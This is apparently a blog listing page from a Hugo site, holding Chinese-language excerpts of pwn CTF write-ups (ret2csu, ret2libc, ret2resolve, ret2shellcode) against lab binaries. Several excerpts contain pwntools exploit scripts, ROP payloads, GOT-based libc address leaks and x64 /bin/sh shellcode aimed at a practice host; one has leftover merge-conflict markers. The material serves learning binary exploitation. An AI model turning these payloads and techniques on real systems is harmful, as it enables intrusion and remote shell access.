@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>ctf | CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="ctf - CAI dog">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="https://jellyfish-pro.github.io/ctf/index.xml">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="ctf" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ctf"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }
+  ]
+}
+</script>
+</head>
+
+<body class="list" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span class="active">ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header"><div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a></div>
+  <h1>
+    ctf
+  </h1>
+</header>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ret2csuinit_new
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先利用checksec命令查看保护机制：
+64位，没有canary检测，没有地址随机化，got表可写。
+然后放进IDA里进行看一下反编译：
+我们可以看到plt表中调用的是write函数。
+这样我们就可以通过write函数泄露函数地址：
+64位同样需要我们构造gadget。
+我们利用pwntools的ROPgadget指令查找gadget：
+ROPgadget --binary format_base --only &#39;pop|ret&#39; 我们知道write函数需要传递三个参数，但是通过上图，我们发现我们只能传递两个参数。
+如果不能保证参数个数，那么我们就不能保证函数掉用的成功率。
+所以这时候我们又需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。
+_libc_csu_init函数因为特殊的汇编构造，可以帮助我们调用三个参数的函数。
+首先我们看到这个函数的汇编代码（这里的汇编代码并不是题目的汇编代码，题目可能会和这里给出的有所差别，但是原理是一样的）：
+这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。
+将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 &#43;rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。
+.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx	//设定为0.text:000000000040061B pop rbp	//设定为1.text:000000000040061C pop r12	//放入需要调用的函数地址.text:000000000040061E pop r13	//放入第三个参数.text:0000000000400620 pop r14	//放入第二个参数.text:0000000000400622 pop r15	//放入第三个参数.text:0000000000400624 retn	//返回到0x400600.text:0000000000400600 mov rdx, r13	//第三个参数放入rdx.text:0000000000400603 mov rsi, r14	//第二个参数放入rsi....</p>
+  </div>
+  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2csuinit_new" href="https://jellyfish-pro.github.io/ctf/ret2csuinit_new/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ret2csuinit_old
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看具体信息：
+在程序中也没有system和/bin/sh
+栈也不是可读可写可执行。
+那我们选择通过泄露函数地址，来查找libc版本：
+那么问题又来了，这个程序没有puts函数，只有write函数，需要3个参数，而在x64我们需要用到rdi，rsi，rdx，而在程序中我们并没有找到pop_rdx。
+这时候我们就需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。
+首先我们看到这个函数的汇编代码：
+这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。
+将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 &#43;rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。
+.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx	//设定为0.text:000000000040061B pop rbp	//设定为1.text:000000000040061C pop r12	//放入需要调用的函数地址.text:000000000040061E pop r13	//放入第三个参数.text:0000000000400620 pop r14	//放入第二个参数.text:0000000000400622 pop r15	//放入第三个参数.text:0000000000400624 retn	//返回到0x400600.text:0000000000400600 mov rdx, r13	//第三个参数放入rdx.text:0000000000400603 mov rsi, r14	//第二个参数放入rsi.text:0000000000400606 mov edi, r15d	//第一个参数放入rdi.text:0000000000400609 call qword ptr [r12&#43;rbx*8]//因为rbx为0，所以只有r12....</p>
+  </div>
+  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2csuinit_old" href="https://jellyfish-pro.github.io/ctf/ret2csuinit_old/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ret2libc1_new
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看基本信息：
+可以看到PIE未开启，但NX打开了。
+说明.text段的地址固定，但内存不可执行。
+因为是64位程序，所以我们需要考虑构造gadget
+拖入IDA查看一些基本信息：
+看到在main函数中，有一个gets函数，gets函数接收字符串时碰到’\n’才会停止接收，通过这个特性我们就可以构造足够长的字符串，使得栈溢出，从而覆盖程序原本的栈，达到控制程序的目的。
+计算从接收第一个字符到函数返回值之间的偏移量：
+然后在IDA中用shift&#43;f12,查看字符串：
+得到/bin/sh的地址。
+然后继续查看汇编，我们可以看到有一个call system的指令
+那么我们的思路就是，通过padding溢出到ret，然后让ret返回到call system的地址，让system调用/bin/sh的地址，这样就能够get shell。
+这/bin/sh的地址和system的地址都得到了，但是这是64位的文件，是通过寄存器，所以我们不能像32位一样将参数写入栈就不管了。
+所以这里我们不能通过将/bin/sh的地址放进栈中，而是要使用ROP找到指令将/bin/sh的地址放入寄存器rdi中：
+现在所有的要素都收集齐了，我们再理一下：
+payload = flat([&#39;a&#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)]) #ret2libc1from pwn import *#p = process(&#34;./ret2libc1&#34;)p = remote(&#39;10.0.25.109&#39;,10005)sys_addr = 0x400687bin_addr = 0x601048pop_rdi_ret = 0x400793#p.recvuntil(&#34;Hello, what&#39;s your name?\n&#34;)react = &#34;Hello, what&#39;s your name?\n&#34;payload = flat([&#39;a&#39;*120,p64(pop_rdi_ret),p64(bin_addr),p64(sys_addr)])#gdb.attach(p)#pause()#p.sendline(payload)p.sendlineafter(react,payload)p.interactive() </p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2libc1_new" href="https://jellyfish-pro.github.io/ctf/ret2libc1_new/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ret2libc1_old
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看相关信息
+可以看到，32位，没有开启canary，没有开启PIE，但是打开了NX。
+在IDA中我们可以看到system()函数：
+得到system()函数地址之后，我们还需要得到/bin/sh字符的地址。
+通过ROPgadget，我们可以查找到文件中是否存在/bin/sh字符：
+现在system() 的地址，/bin/sh 的地址都有了。
+接下来就是找到可利用的溢出点，算出到ret的偏移量：
+利用cyclic生成200个字符：
+shangdi4sb@ubuntu:~/pwntest/111$ cyclic 200aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab 用gdb打开ret2libc1，使用R命令让程序跑起来，输入生成的字符串，发现ret转跳到了奇怪的位置：
+再利用cyclic计算偏移量：
+shangdi4sb@ubuntu:~/pwntest/111$ cyclic -l 0x62616164112 现在我们知道了ret 的偏移量，知道了system()函数的地址，也知道了/bin/sh的地址，接下里就是需要将其连接到一起。
+payload = &#39;a&#39; * 112 &#43; system_addr &#43; &#39;b&#39; * 4 &#43; /bin/sh_addr #ret2libc1.pyfrom pwn import *p = remote(&#34;10.0.25.109&#34; , 10005)binsh_addr = 0x8048720system_addr = 0x08048460payload = flat([&#39;a&#39; * 112, system_addr, &#39;b&#39; * 4, binsh_addr])#注：因为system()函数在调用时，栈会向起传入4个字节当作system()函数的返回地址，所以构造4个b将其当作地址传给system()p.sendline(payload)p.interactive() </p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2libc1_old" href="https://jellyfish-pro.github.io/ctf/ret2libc1_old/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ret2libc2_new
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先使用checksec指令查看基本情况：
+再放入ida进行查看：
+可以看到并没有/bin/sh字符串，但是我们可以看到有gets函数和system函数
+所以我们的思路就是两次利用gets函数，第一次利用gets对栈进行布置，第二次利用gets输入/bin/sh。
+其中buf_addr是存放/bin/sh的地址，我们通过gdb中的vmmap指令可以查看哪一段代码是可写可读的：
+所以我们将/bin/sh写在0x601000中
+payload = b&#39;a&#39;*120 &#43; p64(pop_rdi_ret) &#43; p64(buf2_addr) &#43; p64(gets_addr)payload &#43;= p64(pop_rdi_ret) &#43; p64(buf2_addr) &#43; p64(sys_addr) #ret2libc2_x64from pwn import*#p = process(&#39;./ret2libc2&#39;)p = remote(&#39;10.0.25.109&#39;,10006)if args.G:gdb.attach(p)pause()sys_addr = 0x400570gets_addr = 0x400580pop_rdi_ret = 0x400793pop_rsi = 0x400791buf2_addr = 0x601000context.log_level = &#39;debug&#39;payload = b&#39;a&#39;*120 &#43; p64(pop_rdi_ret) &#43; p64(buf2_addr) &#43; p64(gets_addr)payload &#43;= p64(pop_rdi_ret) &#43; p64(buf2_addr) &#43; p64(sys_addr) p....</p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2libc2_new" href="https://jellyfish-pro.github.io/ctf/ret2libc2_new/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ret2libc2_old
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看基本信息：
+开启了NX 保护，说明内存不可执行，但是对这道题来说，并不重要
+拖入IDA中查看代码：
+可以看到有gets函数。
+到这里我们的思路就和ret2libc1的思路一样，找到溢出点，计算ret的偏移量，将ret指向system函数，再使用system函数运行/bin/sh。
+随后我们查看文件中是否有system函数：
+有system函数，然后查看是否有/bin/sh：
+但我们在文件中，并没有找到/bin/sh。
+我们现在找到了gets函数、system函数、但并没有找到/bin/sh。
+这种情况我们就可以选择调用gets函数，将我们自己输入的/bin/sh存放到.bss段：
+BSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。可执行程序包括BSS段、数据段、代码段。 大概思路就是，我们先填充字符，填充掉第一次gets存放的地址，然后再让gets的返回值返回到gets函数开头，再次条用gets，这时输入shellcode，让gets将shellcode存放到.bss段，然后返回system函数，调用shellcode。
+计算gets函数ret的偏移量
+payload = flat([&#34;a&#34;*112,gets,system,buf2,buf2]) #ret2libc2from pwn import *p = remote(&#34;10.0.25.109&#34;,10006)sys_addr = 0x8048490gets_addr = 0x8048460buf2_addr = 0x804A080payload = flat([&#34;a&#34;*112,gets_addr,sys_addr,buf2_addr,buf2_addr])p.sendline(payload)p.sendline(&#39;/bin/sh&#39;)p.interactive() </p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2libc2_old" href="https://jellyfish-pro.github.io/ctf/ret2libc2_old/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ret2libc3_new
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看基本信息：
+v1 大小为 0x70，ret 大小为 8，故 padding 为 0x78
+然后查看/bin/sh 和 system：
+并没有/bin/sh 和 system。
+搜索 syscall 也没有找到
+这种情况下我们只能选择泄露函数地址，查找 libc.so 版本来调用函数了。
+通过 IDA 查看伪代码，我们可以看到程序调用 puts 函数和 setbuf 函数，于是我们选择泄露 这俩函数的地址来查找 libc 的版本：
+from pwn import *context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10007)#p = process(&#39;./ret2libc3&#39;)if args.G:gdb.attach(p)pause()elf = ELF(&#39;./ret2libc3&#39;)main = 0x4006AEpop_rdi_ret = 0x400743puts_addr = 0x400695pop_rsi_r15_ret = 0x400741payload = b&#39;a&#39;*120&#43;p64(pop_rdi_ret) &#43; p64(elf.got[&#39;puts&#39;]) payload &#43;= p64(elf....</p>
+  </div>
+  <footer class="entry-footer">2 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2libc3_new" href="https://jellyfish-pro.github.io/ctf/ret2libc3_new/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ret2libc3_old
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看文件基本属性：
+看到文件并没有开启PIE，所以代码段的地址是相对固定的。
+然后查看是否有system函数和/bin/sh
+可以看到并没有system函数，也没有/bin/sh
+搜索int 0x80也可以看到并没有：
+没有int 0x80也不能调用execve函数
+虽然我们没有搜索到system函数和/bin/sh，那么这就意味着，函数中没有吗，我们打开gdb进行搜索：
+可以看到，在gdb中我们可以搜索到相应的函数和字符，并且他们都指向了libc-2.31.so
+libc.so是动态链接库，在libc中函数之间的偏移量是固定的，也就是说，如果我们知道了基地址和system的偏移量，我们就可以调用system函数，同理，/bin/sh也可以用这样的办法调用。
+那么如何获得基地址呢？我们可以利用已知函数的真实地址减去这个函数的偏移地址，那么就等于基地址。
+现在我们使用puts函数举例：
+​	当程序第一次调用puts时，程序会跳转到plt表，查找puts函数，然后根据plt表的引导去动态链接库中调用函数，并且把puts函数的真实地址存放到got表中，当程序第二次调用puts时，就会直接去got表找puts函数的地址，而不是再次去plt表。
+所以我们可以使用函数自身的puts函数，输出puts在got表中的地址：
+payload = b&#39;a&#39;*(0x6c&#43;4) //padding&#43;p32(elf.plt[&#39;puts&#39;]) //使函数转跳到puts函数&#43;p32(main)	//puts函数的返回值&#43;p32(elf.got[&#39;puts&#39;]) //利用puts函数输出puts函数的gots表上的地址 上面利用了puts输出了puts函数的真实地址，接下来就是接收这个地址，计算基地址：
+puts=u32(p.recv(4))	//将接收到的地址放入puts中print(&#39;puts&#39;,hex(puts))	libc =LibcSearcher(&#39;puts&#39;,puts)	//在libcsearcher中寻找puts函数的偏移量libcbase=puts-libc.dump(&#39;puts&#39;)	//计算基址system=libcbase&#43;libc.dump(&#39;system&#39;)	//计算出system函数的真实地址bin_sh=libcbase&#43;libc.dump(&#39;str_bin_sh&#39;)	///bin/sh的真实地址print(&#39;system&#39;,hex(system))print(&#39;binsh&#39;,hex(bin_sh)) 在这里我们要介绍一下LibcSearcher，这是一个查找libc版本，寻找函数在libc.so里偏移的python库,可以在github上直接搜到和安装，并且在github上就有下载方法和使用方法
+因为上面输出puts地址时，我们重新返回了main函数，所以我们将新的payload发送过去：
+payload2=b&#39;a&#39;*(0x64&#43;4)&#43;p32(system)&#43;p32(0xdeadbeef)&#43;p32(bin_sh) from pwn import *from LibcSearcher import *#context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10007)#p = process(&#39;./ret2libc3&#39;)elf = ELF(&#39;./ret2libc3&#39;)main = 0x08048618if args.G:gdb.attach(p)payload = b&#39;a&#39;*(0x6c&#43;4)&#43;p32(elf....</p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2libc3_old" href="https://jellyfish-pro.github.io/ctf/ret2libc3_old/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ret2resolve1
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看基本情况：
+在IDA里我们可以看到main函数和产生溢出的函数：
+我们可以看到，main函数中有一个write函数，而vuln函数中有溢出点。
+那么我们可以使用write函数来泄露函数地址，从而得到libc版本，再通过/bin/sh和system函数的偏移量来做这道题。
+首先我们需要泄露服务器端的函数地址：
+from pwn import *context.log_level = &#39;debug&#39;p = remote(&#39;10.0.25.109&#39;,10009)elf = ELF(&#39;ret2resolve&#39;)#p = process(&#39;./ret2resolve&#39;)if args.G:gdb.attach(p)payload = 112 * b&#39;a&#39;payload &#43;= p32(elf.plt[&#39;write&#39;])payload &#43;= p32(elf.symbols[&#39;main&#39;])payload &#43;= p32(1)payload &#43;= p32(elf.got[&#39;write&#39;])payload &#43;= p32(4)payload &#43;= p32(elf.symbols[&#39;main&#39;])p.sendline(payload)write_addr = u32(p.recvuntil(&#39;\xf7&#39;)[-4:])#write_addr = u32(p.recv(4))print(&#39;write_addr =&#39;,hex(write_addr)) 运行脚本后，就可以打印出write函数的地址：
+可以看到，函数的后12位是460。
+然后修改一下上面的脚本，我们可以输出一些其他的函数：
+我们使用ret2libc3中提到的查看libc版本的网址：https://libc.rip/
+这样，libc的版本就被泄露了。然后根据偏移量，我们可以计算出程序的基地址和system函数和/bin/sh的地址：
+libcbase = write_addr - 0xd44d0system = libcbase &#43; 0x3a950binsh = libcbase &#43; 0x15912bpayload = 112 * b&#39;a&#39;payload &#43;= p32(system)payload &#43;= p32(0xdeadbeef)payload &#43;= p32(binsh)sh....</p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2resolve1" href="https://jellyfish-pro.github.io/ctf/ret2resolve1/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2>ret2shellcode
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>首先查看基本情况：
+ida中也没有看到system和/bin/sh
+可以看到栈可执行，我们需要判断是jmp rsp还是输入shellcode：
+在IDA中我们可以看到read函数可以输入0x40个字符，但buf却只存取8个字符，所以我们有0x38个字符可以输入，这个长度我们可以使用shellcode
+shellcode = &#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#39; 又因为程序开启了PIE，我们需要计算shellcode的地址：
+p.recvuntil(&#39;[&#39;) buf_addr = p.recvuntil(&#39;]&#39;,drop=True) 这样就可以计算出存放字符的起始地址
+然后构造payload：
+payload = flat([&#39;a&#39;*16,p64(int(buf_addr,16)&#43;8&#43;8&#43;8),shellcode])//‘a’*16：填充字符&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD//p64(int(buf_addr,16)&#43;8&#43;8&#43;8)：buf_addr的起始地址&#43;read函数读取的8位&#43;rbp的填充&#43;shellcode的8位地址=======//p64(int(buf_addr,16)&#43;8&#43;8&#43;8)：buf_addr的起始地址&#43;read函数读取的8位&#43;leave使用掉的8位&#43;shellcode的8位地址//leave = mov esp,ebp;pop ebp&gt;&gt;&gt;&gt;&gt;&gt;&gt; origin/dev #ret2shellcode_x64from pwn import *#p = process(&#34;./ret2shellcode&#34;)p = remote(&#34;10.0.25.109&#34;,10000)shellcode = &#39;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#39;p.recvuntil(&#39;:&#39;)buf_addr = p.recvuntil(&#39;\n&#39;,drop=True)payload = flat([&#39;a&#39;*16,p64(int(buf_addr,16)&#43;8&#43;8&#43;8),shellcode])p.sendline(payload)p.interactive() </p>
+  </div>
+  <footer class="entry-footer">1 min&nbsp;·&nbsp;shangdi4sb</footer>
+  <a class="entry-link" aria-label="post link to ret2shellcode" href="https://jellyfish-pro.github.io/ctf/ret2shellcode/"></a>
+</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="prev" href="https://jellyfish-pro.github.io/ctf/">
+      «&nbsp;Prev&nbsp;
+    </a>
+    <a class="next" href="https://jellyfish-pro.github.io/ctf/page/3/">Next&nbsp;&nbsp;»
+    </a>
+  </nav>
+</footer>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
